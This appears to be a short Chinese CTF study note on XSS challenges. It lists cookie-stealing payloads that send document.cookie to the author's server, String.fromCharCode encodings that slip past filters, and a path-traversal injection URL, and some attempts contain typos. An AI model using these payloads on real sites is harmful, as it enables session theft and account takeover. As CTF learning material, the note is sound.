web题目 中xss的payload
这是第一次去接触xss类型的题目，学到了三点

1.如何去将目标的cookies弹到自己的服务器上
document.location="http://115.159.xx.xx/xss.php?cookie="+document.cookie new Image().src="http://115.159.xx.xx/xss.php?cookie="+document.cookie

2.如果前端过滤了尖括号等字符如何去bypass
document.location=String.fromCharCode(34,104,116,116,112,58,47,47,49,49,53,46,49,53,57,46,51,49,46,50,51,47,120,115,115,46,112,104,112,63,99,111,111,107,105,101,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101);

3.目录穿越导致的xss执行（这个目前还不是很理解，后面要去多查询该方面的资料
/jquery.min.js%2f..%2f..%2f../

有的时候payload最好在chrome的控制台里执行一下试试，因为经常会出现一两个符号错误导致的代码执行不通过
以下为尝试的几次
window.location.href="http://115.159.xx.xx/xss.php?cookie="+document.cookie;

window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,49,53,46,49,53,57,46,51,49,46,50,51,47,120,115,115,46,112
http://39.107.33.96:20000/index.php/view/article/41479/jquery.min.js%2f..%2f..%2f../%22http://115.159.xx.xx/xss.php?cookie=%22+document.cookie;

windows.lcoation.href=String.fromCharCode(104,116,116,112,58,47,47,49,49,53,46,49,53,57,46,51,49,46,50,51,47,120,115,115,46,112,104,112,63,99,111,111,107,105,101,61)+document.cookie;  